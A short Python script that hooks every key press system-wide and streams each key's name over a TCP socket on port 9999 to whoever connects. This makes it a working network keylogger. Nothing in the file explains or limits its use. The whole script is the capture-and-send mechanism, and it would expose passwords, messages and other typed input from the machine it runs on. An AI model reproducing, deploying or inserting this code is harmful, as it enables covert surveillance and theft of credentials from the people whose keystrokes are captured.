import threading
import keyboard
import socket

def send_keys(client):
    def on_key(event):
        try:
            client.send(f"{event.name}\n".encode())
        except:
            pass  # connection might be closed

    keyboard.on_press(on_key)
    keyboard.wait()  # Keep the thread alive

if __name__ == '__main__':
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))
    server.listen(5)
    client, addr = server.accept()

    print(client.recv(1024).decode())  # greeting

    # Start sending key events in another thread
    threading.Thread(target=send_keys, args=(client,), daemon=True).start()

    while True:
        pass  # Keep main thread alive